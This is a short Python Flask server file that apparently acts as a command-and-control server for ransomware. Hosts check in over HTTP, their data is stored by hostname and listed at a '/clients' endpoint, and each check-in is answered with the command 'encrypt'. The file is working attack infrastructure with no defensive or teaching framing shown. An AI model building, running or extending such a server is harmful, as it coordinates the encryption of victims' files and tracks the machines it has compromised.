from flask import Flask, request, jsonify

app = Flask(__name__)
clients = {}

@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        client_data = request.get_json()
        print(f"Received data: {client_data}")
        if not client_data:
            return jsonify({"error": "No JSON data received"}), 400
        # Save to client using hostname
        hostname = client_data.get("hostname", "unknown")
        clients[hostname] = client_data
        # Send a command to the client
        command = "encrypt"  # Change this to test different commands
        return jsonify({"command": command})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/clients', methods=['GET'])
def get_clients():
    return jsonify(clients)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
